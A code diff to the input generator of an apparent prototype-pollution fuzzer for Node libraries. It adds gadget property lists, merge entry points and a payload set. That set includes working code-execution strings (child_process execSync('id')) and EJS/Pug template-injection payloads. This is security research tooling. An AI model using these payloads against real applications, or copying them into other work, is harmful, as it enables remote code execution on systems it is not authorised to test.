@@ -1,5 +1,14 @@
 import { logger } from '../utils/logger.js';
 
+// Pre-allocated constant — avoids recreating this array on every call
+const GENERIC_POLLUTION_PROPS = [
+  'block', 'debug', 'compileDebug', 'self', 'line', 'pretty', 'filename',
+  'basedir', 'doctype', 'globals', 'filters', 'plugins', 'cache',
+  'template', 'autoEscape', 'defaultFilter', 'tags', 'rmWhitespace',
+  'e', 'async', 'root', 'views', 'partials', 'helpers', 'layout',
+  'outputFunctionName', 'localsName', 'destructuredLocals', 'escape'
+];
+
 /**
  * Science-Based Input Generation Engine
  *
@@ -45,6 +54,14 @@ export class InputGeneration {
       // Alpha/beta parameters for Beta distribution (Bayesian bandit)
       this.strategyStats.set(s, { successes: 1, failures: 1, totalMutations: 0 });
     }
+
+    // UOP property discovery: properties the target reads as undefined
+    // Fed back from the differential oracle's discoverUOPProperties
+    this.discoveredUOPProperties = new Set();
+    // Track which property+payload combos have been confirmed as gadgets
+    this.confirmedGadgets = new Map();
+    // Track property effectiveness for Thompson sampling
+    this.propertyStats = new Map();
   }
 
   async generateInputs(config, iteration) {
@@ -100,7 +117,32 @@ export class InputGeneration {
   async generateBaseInputs(config, count) {
     const inputs = [];
 
-    for (let i = 0; i < count; i++) {
+    // Always include all dangerous merge/extend entry points first.
+    // These are the most likely sources of prototype pollution, and the
+    // differential oracle MUST test them every iteration — not leave
+    // it to random chance whether they appear in the input batch.
+    const dangerousNames = new Set([
+      'merge', 'extend', 'defaults', 'defaultsDeep', 'assign',
+      'deepExtend', 'deepMerge', 'mixin', 'set', 'clone', 'cloneDeep',
+    ]);
+    const getBase = (n) => n.includes('.') ? n.split('.').pop() : n;
+
+    if (config.entryPoints) {
+      for (const ep of config.entryPoints) {
+        if (inputs.length >= count) break;
+        if (!dangerousNames.has(getBase(ep.name))) continue;
+        // Only include top-level or 1-deep (e.g., "jquery.extend", not "cssHooks.width.set")
+        if (ep.name.split('.').length > 2) continue;
+        inputs.push({
+          entryPoint: ep.name,
+          type: 'object',
+          value: this.generateObjectInput(),
+          metadata: { pollution: false, generation: 'base', energy: 1.0 }
+        });
+      }
+    }
+
+    for (let i = inputs.length; i < count; i++) {
       const input = this.createBaseInput(config);
       inputs.push(input);
     }
@@ -379,16 +421,25 @@ export class InputGeneration {
       // Add to seed corpus with boosted energy
       const energyBoost = Math.min(8, Math.pow(2, coverageResult.newEdges));
       this.seedCorpus.push({
-        input: structuredClone(input),
+        input: { ...input, metadata: { ...input.metadata } },
         energy: energyBoost,
         novelEdges: coverageResult.newEdges,
         addedAt: Date.now()
       });
 
-      // Evict lowest-energy seeds when corpus exceeds size cap
+      // Evict lowest-energy seed when corpus exceeds size cap.
+      // O(n) single-pass min-find instead of O(n log n) sort.
       if (this.seedCorpus.length > this.maxSeedCorpusSize) {
-        this.seedCorpus.sort((a, b) => b.energy - a.energy);
-        this.seedCorpus.length = this.maxSeedCorpusSize;
+        let minIdx = 0;
+        let minEnergy = this.seedCorpus[0].energy;
+        for (let i = 1; i < this.seedCorpus.length; i++) {
+          if (this.seedCorpus[i].energy < minEnergy) {
+            minEnergy = this.seedCorpus[i].energy;
+            minIdx = i;
+          }
+        }
+        this.seedCorpus[minIdx] = this.seedCorpus[this.seedCorpus.length - 1];
+        this.seedCorpus.length--;
       }
 
       this.coverageFeedback.novelInputs.push(input);
@@ -405,9 +456,9 @@ export class InputGeneration {
   }
 
   async applyMutationStrategy(input, strategy, config) {
-    const cloned = structuredClone(input);
-    cloned.metadata.generation = 'mutation';
-    cloned.metadata.strategy = strategy;
+    // Shallow clone — mutations overwrite fields, don't mutate nested refs in-place.
+    // structuredClone is 10-100x slower and called thousands of times per session.
+    const cloned = { ...input, metadata: { ...input.metadata, generation: 'mutation', strategy } };
 
     switch (strategy) {
       case 'prototypePollution':
@@ -446,29 +497,15 @@ export class InputGeneration {
     const pollutionTargets = config.pollutionPoints || ['isAdmin', 'isDebug', 'template', 'eval'];
     const target = pollutionTargets[Math.floor(Math.random() * pollutionTargets.length)];
 
-    // Pollution payload values based on known gadget patterns
-    const payloads = [
-      'POLLUTED',
-      'true',
-      '1',
-      'require("child_process").execSync("id")',
-      '(() => { return process })()',
-      'constructor.constructor("return this")()',
-    ];
-    const payload = payloads[Math.floor(Math.random() * payloads.length)];
-
     try {
-      input.value.__proto__ = input.value.__proto__ || {};
-      input.value.__proto__[target] = payload;
-      input.metadata.pollution = true;
-      input.metadata.pollutionTarget = target;
-      input.metadata.pollutionPayload = payload;
+      input.value.__proto__ = { [target]: 'POLLUTED' };
     } catch (error) {
-      input.value.__protoPollution = { [target]: payload };
-      input.metadata.pollution = true;
-      input.metadata.pollutionTarget = target;
+      input.value.__protoPollution = { [target]: 'POLLUTED' };
       input.metadata.pollutionMethod = 'fallback';
     }
+
+    input.metadata.pollution = true;
+    input.metadata.pollutionTarget = target;
 
     return input;
   }
@@ -476,11 +513,12 @@ export class InputGeneration {
   /**
    * Constructor.prototype pollution.
    *
-   * Exploits the constructor property chain: obj.constructor.prototype
-   * This is an alternative pollution vector when __proto__ is filtered.
+   * Bypasses __proto__ protections by using the constructor property
+   * chain: obj.constructor.prototype.target = value.
    *
-   * Reference: Arteau, "Prototype pollution attack in NodeJS application",
-   * NorthSec 2018
+   * Also generates merge-specific payloads that are JSON-parseable
+   * objects like {constructor: {prototype: {key: val}}}, which trigger
+   * deep-merge-based prototype pollution in libraries like lodash.
    */
   applyConstructorPollution(input, config) {
     if (input.type !== 'object') return null;
@@ -488,17 +526,34 @@ export class InputGeneration {
     const pollutionTargets = config.pollutionPoints || ['isAdmin', 'template'];
     const target = pollutionTargets[Math.floor(Math.random() * pollutionTargets.length)];
 
-    try {
-      input.value.constructor = input.value.constructor || {};
-      input.value.constructor.prototype = input.value.constructor.prototype || {};
-      input.value.constructor.prototype[target] = 'CONSTRUCTOR_POLLUTED';
+    const mode = Math.random();
+
+    if (mode < 0.5) {
+      try {
+        input.value.constructor = input.value.constructor || {};
+        input.value.constructor.prototype = input.value.constructor.prototype || {};
+        input.value.constructor.prototype[target] = 'CONSTRUCTOR_POLLUTED';
+        input.metadata.pollution = true;
+        input.metadata.pollutionTarget = target;
+        input.metadata.pollutionMode = 'direct';
+      } catch (error) {
+        input.value.__constructorPollution = { [target]: 'CONSTRUCTOR_POLLUTED' };
+        input.metadata.pollution = true;
+        input.metadata.pollutionTarget = target;
+        input.metadata.pollutionMethod = 'fallback';
+      }
+    } else {
+      input.value = {
+        ...input.value,
+        constructor: {
+          prototype: {
+            [target]: 'MERGE_PP_PAYLOAD'
+          }
+        }
+      };
       input.metadata.pollution = true;
       input.metadata.pollutionTarget = target;
-    } catch (error) {
-      input.value.__constructorPollution = { [target]: 'CONSTRUCTOR_POLLUTED' };
-      input.metadata.pollution = true;
-      input.metadata.pollutionTarget = target;
-      input.metadata.pollutionMethod = 'fallback';
+      input.metadata.pollutionMode = 'merge_payload';
     }
 
     return input;
@@ -676,9 +731,10 @@ export class InputGeneration {
         }
 
         // Mutate the selected seed
-        const base = structuredClone(selectedSeed.input);
-        base.metadata.generation = 'coverage_guided';
-        base.metadata.parentEnergy = selectedSeed.energy;
+        const base = {
+          ...selectedSeed.input,
+          metadata: { ...selectedSeed.input.metadata, generation: 'coverage_guided', parentEnergy: selectedSeed.energy }
+        };
 
         const strategy = rankedStrategies[i % rankedStrategies.length];
         const mutated = await this.applyMutationStrategy(base, strategy, config);
@@ -696,6 +752,153 @@ export class InputGeneration {
     }
 
     return inputs;
+  }
+
+  /**
+   * Generate pollution descriptors for differential testing.
+   *
+   * A pollution descriptor is { property, value } — the property to set on
+   * Object.prototype and the payload value. These are used by the differential
+   * oracle to test whether polluting this property changes library behavior.
+   *
+   * Sources of property names (in priority order):
+   * 1. Discovered UOP properties (from taint log analysis)
+   * 2. Config-defined pollutionPoints
+   * 3. Generic high-value properties
+   *
+   * @param {object} config - Target configuration
+   * @param {number} count - Number of descriptors to generate
+   * @returns {Array<{property: string, value: any}>}
+   */
+  generatePollutionDescriptors(config, count = 10) {
+    const descriptors = [];
+    const properties = this.getPollutionProperties(config);
+    const payloads = this.getPayloads();
+
+    for (let i = 0; i < count; i++) {
+      // Select property: prefer discovered UOP properties (they're real)
+      const property = properties[i % properties.length];
+
+      // Select payload: cycle through different types
+      const payload = payloads[i % payloads.length];
+
+      descriptors.push({ property, value: payload.value, payloadType: payload.type });
+    }
+
+    return descriptors;
+  }
+
+  /**
+   * Get prioritized list of properties to try polluting.
+   */
+  getPollutionProperties(config) {
+    const seen = new Set();
+    const properties = [];
+
+    const addUnique = (prop) => {
+      if (!seen.has(prop)) {
+        seen.add(prop);
+        properties.push(prop);
+      }
+    };
+
+    // Highest priority: UOP properties discovered from actual execution
+    for (const prop of this.discoveredUOPProperties) addUnique(prop);
+
+    // Medium priority: config-defined pollution points
+    for (const prop of (config.pollutionPoints || [])) addUnique(prop);
+
+    // Low priority: generic high-value targets for template engines
+    for (const prop of GENERIC_POLLUTION_PROPS) addUnique(prop);
+
+    return properties;
+  }
+
+  /**
+   * Get payload values designed to trigger different sink types.
+   *
+   * Payloads are crafted to:
+   * 1. Reach code execution sinks (eval, Function, exec)
+   * 2. Be detectable in output (sentinel values)
+   * 3. Trigger type coercion edge cases
+   * 4. Match patterns template engines actually consume
+   */
+  getPayloads() {
+    return [
+      // Sentinel value — detectable in output without being dangerous
+      { type: 'sentinel', value: '__UOPFUZZ_MARKER_7f3a__' },
+
+      // Code execution payloads for template engines (compile-time injection)
+      { type: 'rce_function', value: 'x]});process.mainModule.require("child_process").execSync("id");//' },
+      { type: 'rce_require', value: "require('child_process').execSync('id')" },
+      { type: 'rce_constructor', value: 'constructor.constructor("return this")().process.mainModule.require("child_process").execSync("id")' },
+
+      // Boolean/truthy — many gadgets check if (options.debug) etc
+      { type: 'boolean_true', value: true },
+      { type: 'boolean_string', value: '1' },
+
+      // Template injection payloads
+      { type: 'template_pug', value: '-var x = process.mainModule.require("child_process").execSync("id")' },
+      { type: 'template_ejs', value: '<%= process.mainModule.require("child_process").execSync("id") %>' },
+
+      // Object with toString — triggers type coercion
+      { type: 'coercion_tostring', value: { toString: () => '__UOPFUZZ_COERCED__' } },
+
+      // Function payload — if the library calls the polluted value
+      { type: 'function', value: function() { return '__UOPFUZZ_CALLED__'; } },
+
+      // Numeric payloads
+      { type: 'number', value: 1337 },
+      { type: 'zero', value: 0 },
+
+      // Null/undefined boundary
+      { type: 'empty_string', value: '' },
+      { type: 'null', value: null },
+    ];
+  }
+
+  /**
+   * Feed discovered UOP properties back from the differential oracle.
+   * These are properties the library actually reads as undefined,
+   * making them prime candidates for prototype pollution.
+   */
+  integrateUOPDiscovery(properties) {
+    let newCount = 0;
+    for (const prop of properties) {
+      if (!this.discoveredUOPProperties.has(prop)) {
+        this.discoveredUOPProperties.add(prop);
+        newCount++;
+        // Initialize property stats for Thompson sampling
+        if (!this.propertyStats.has(prop)) {
+          this.propertyStats.set(prop, { successes: 1, failures: 1 });
+        }
+      }
+    }
+    return newCount;
+  }
+
+  /**
+   * Update property effectiveness after differential oracle result.
+   */
+  updatePropertyFeedback(property, wasEffective) {
+    const stats = this.propertyStats.get(property);
+    if (stats) {
+      if (wasEffective) {
+        stats.successes++;
+      } else {
+        stats.failures++;
+      }
+    }
+  }
+
+  /**
+   * Record a confirmed gadget for reporting and deduplication.
+   */
+  recordConfirmedGadget(property, payload) {
+    const key = `${property}:${typeof payload}`;
+    if (!this.confirmedGadgets.has(key)) {
+      this.confirmedGadgets.set(key, { property, payload, confirmedAt: Date.now() });
+    }
   }
 
   /**
@@ -738,7 +941,9 @@ export class InputGeneration {
       strategies: this.mutationStrategies.length,
       seedCount: this.seedCorpus.length,
       corpusEntropy: this.getCorpusEntropy(),
-      strategyEffectiveness
+      strategyEffectiveness,
+      discoveredUOPProperties: [...this.discoveredUOPProperties],
+      confirmedGadgets: [...this.confirmedGadgets.values()]
     };
   }
 }
